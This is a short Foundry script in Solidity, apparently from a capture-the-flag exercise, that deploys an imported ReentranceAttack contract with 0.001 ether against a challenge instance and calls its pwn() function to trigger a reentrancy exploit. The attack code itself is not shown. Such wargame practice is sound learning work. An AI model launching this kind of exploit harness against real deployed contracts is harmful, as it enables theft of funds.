// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./attacks/10_ReentranceAttack.sol";
import {Script} from "forge-std/Script.sol";

contract ReentranceScript is Script {
    function run() external {
        address instance_addr = address(uint160((vm.envUint("10_INSTANCE"))));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentranceAttack reentranceAttack = new ReentranceAttack{value: 0.001 ether}(payable(instance_addr));
        reentranceAttack.pwn();
        vm.stopBroadcast();
    }
}
